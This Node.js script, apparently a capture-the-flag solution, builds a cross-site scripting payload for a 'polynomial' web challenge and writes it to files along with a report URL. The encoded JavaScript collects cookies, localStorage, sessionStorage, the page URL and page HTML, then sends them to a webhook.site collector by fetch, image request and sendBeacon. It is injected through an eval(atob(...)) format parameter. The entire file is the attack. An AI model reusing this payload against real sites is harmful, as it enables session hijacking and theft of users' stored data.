const fs=require("fs");
const WH="https://webhook.site/964b40c3-5ed4-4f22-85e7-9ae0e6bfd1e2";
const CODE =
  "var q='';"+
  "try{q+='&c='+encodeURIComponent(document.cookie)}catch(e){}"+
  "try{q+='&l='+encodeURIComponent(JSON.stringify(window.localStorage))}catch(e){}"+
  "try{q+='&s='+encodeURIComponent(JSON.stringify(window.sessionStorage))}catch(e){}"+
  "try{q+='&u='+encodeURIComponent(location.href)}catch(e){}"+
  "try{q+='&h='+encodeURIComponent(document.documentElement.innerHTML.slice(0,4000))}catch(e){}"+
  "try{fetch('"+WH+"/f?'+q)}catch(e){}"+
  "try{new Image().src='"+WH+"/x?'+q}catch(e){}"+
  "try{navigator.sendBeacon('"+WH+"/b?'+q)}catch(e){}";
const b64 = Buffer.from(CODE,"utf8").toString("base64");
const format = "x:eval(atob(document.forms.item(0).dataset.formula))";
const qs = "x=1&y=2&formula="+encodeURIComponent(b64)+"&format="+encodeURIComponent(format)+"&autoEval=1";
const reportPath = "/?"+qs;
fs.writeFileSync("payload.json", JSON.stringify({WH,CODE,b64,format,reportPath,fullUrl:"https://polynomial.secso.cc/?"+qs},null,2));
fs.writeFileSync("report_body.txt", "url="+encodeURIComponent(reportPath));
console.log("ok");
